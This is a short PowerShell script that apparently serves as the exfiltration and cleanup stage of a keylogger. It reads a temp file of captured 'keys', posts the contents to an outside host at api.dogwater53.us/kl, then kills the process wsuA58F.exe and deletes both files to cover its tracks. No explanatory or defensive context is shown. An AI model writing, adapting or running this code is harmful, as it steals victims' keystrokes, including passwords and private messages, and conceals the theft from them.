$url = "https://api.dogwater53.us/kl"
$body = @{"keys" = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")}
Invoke-WebRequest -Method 'Post' -Uri $url -Body ($body|ConvertTo-Json) -ContentType "application/json"
Remove-Item "$env:temp\wsuA58F.tmp"
cmd /c "taskkill -f -im wsuA58F.exe"
Remove-Item "$env:temp\wsuA58F.exe"
